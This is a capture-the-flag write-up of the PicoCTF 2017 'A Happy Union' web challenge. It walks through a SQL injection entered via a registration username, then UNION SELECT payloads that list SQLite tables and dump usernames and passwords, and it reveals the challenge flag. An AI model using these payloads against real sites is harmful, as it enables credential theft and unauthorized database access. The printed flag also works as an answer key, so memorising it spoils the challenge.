# PicoCTF_2017: A Happy Union

**Category:** Web Exploitation
**Points:** 110
**Description:**

>I really need access to [website](http://shell2017.picoctf.com:23598/), but I forgot my password and there is no reset. Can you help? I like lite sql :)

**Hint:**

>A SQL union allows a single query to select values from multiples tables.

## Write-up

I really need access to website, but I forgot my password and there is no reset. Can you help? I like lite sql :)

```html
w3ndige@W3ndige ~> curl http://shell2017.picoctf.com:41558/
<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Top Notch Forum</title>
    <link href="/static/css/bootstrap.min.css" rel="stylesheet">
    <link href="/static/css/style.css" rel="stylesheet">  
  </head>
    <body>
        <div class="container">
          <div class="row">
            <div class="text-center">
                <h1> Welcome to the Super Poster Forum! </h1>
            </div>
        </div>
        <div class="row">
            <br />
            <br />
            <br />
            <br />
        </div>
        <div class="row">
            <div class="col-md-12 text-center">
                <a href="/login" class="btn btn-primary btn-md" role="button">Login</a>
                <a href="/register" class="btn btn-primary btn-md" role="button">Register</a>
            </div>
        </div>
      </div>
        <script src="/static/js/bootstrap.min.js"></script>
        <script src="/static/js/jquery.min.js"></script>
        <script type="text/javascript" src="/static/js/client.js"></script>

    </body>
</html>⏎         
```

A happy union? It has to do something with  **union sql injection**. Let's firstly check, how bad can we go when registering a new user.

```html
username: ' OR 1 = 1
password: asd
```

Now, after logging in, we can clearly see the SQL query which is used to take out the data from the database. And yeah, our input isn't sanitized at all, so we're clear to create  **UNION**  injection.

```sql
select id, user, post from posts where user = '' OR 1 = 1';
```

Our first step would be creating a query that will tell us names of the tables in the database. Since we know it's  **sqlite**  it won't be that hard.

```sql
' union SELECT null, null, name FROM sqlite_master;--
```

We have to use 2  **null**  columns, since the base query is taking out content of 3 columns, and so we have to in the union query. Dashes in the end will comment out everything afer them, just in case.

```html
<div class="row">
     <div class="text-center">
         <h1> Welcome &#39; union SELECT null, null, name FROM sqlite_master;-- to the Super Poster Forum! </h1>
     </div>
 </div>

 <div class="row">
     <div class="text-center">
         <h3> The current posts are:</h3>
     </div>
 </div>
 <div class="row">
     <table class="table">
         <thead>
         <tr>
             <th>Post ID</th>
             <th>User</th>
             <th>Value</th>
         </tr>
         </thead>
         </tbody>
                 <tr><td>None </td><td> None</td> <td> posts</td></tr>

                 <tr><td>None </td><td> None</td> <td> sqlite_sequence</td></tr>

                 <tr><td>None </td><td> None</td> <td> users</td></tr>
         </tbody>
     </table>
 </div>
```

Great, we have  **users**  table, from which we can now try to get the flag. Here we go with the last query.

```sql
' union SELECT user, pass, null FROM users;--
```

User, pass column names? Let's check that out.

```html
<div class="row">
    <div class="text-center">
        <h1> Welcome &#39; union SELECT user, pass, null FROM users;-- to the Super Poster Forum! </h1>
    </div>
</div>
<div class="row">
    <div class="text-center">
        <h3> The current posts are:</h3>
    </div>
</div>
<div class="row">
    <table class="table">
        <thead>
        <tr>
            <th>Post ID</th>
            <th>User</th>
            <th>Value</th>
        </tr>
        </thead>
        </tbody>
                <tr><td>&#39; union SELECT user, pass, null FROM users;-- </td><td> asd</td> <td> None</td></tr>

                <tr><td>admin </td><td> flag{union?_why_not_onion_b80f530ed953ccdd0dfc6f2456dc7d0e}</td> <td> None</td></tr>
        </tbody>
    </table>
</div>
```

Great SQL Injection challenge!
<!--stackedit_data:
eyJoaXN0b3J5IjpbNjczNTI1MTMzXX0=
-->
